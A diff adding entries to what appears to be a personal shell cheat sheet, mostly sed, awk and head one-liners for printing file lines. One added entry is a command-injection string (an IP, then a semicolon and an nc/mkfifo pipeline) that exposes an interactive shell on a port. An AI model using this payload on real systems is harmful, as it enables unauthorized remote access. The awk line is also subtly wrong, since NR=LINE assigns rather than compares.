@@ -257,3 +257,27 @@ dpkg --print-architecture
 ```bash
 lsb_release -a
 ```
+* Another way to get reverse shell with command execution
+```bash
+192.168.0.18; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1  | nc -lp 9999 > /tmp/f
+```
+
+* Print out the content of a file at LINE number (-n in sed is quiet)
+```bash
+awk 'NR=LINE{print}' FILE
+sed -n -e LINEp FILE
+sed -n LINEp FILE
+sed -n 'LINE{p;q}' FILE
+```
+
+* Print out a range of line of a file
+```bash
+sed -n -e '100,110 p' FILE
+sed -n 100,110p FILE
+```
+
+* Output the first X line of a file
+```bash
+sed 'X{p;q}' FILE
+head -n X FILE
+```
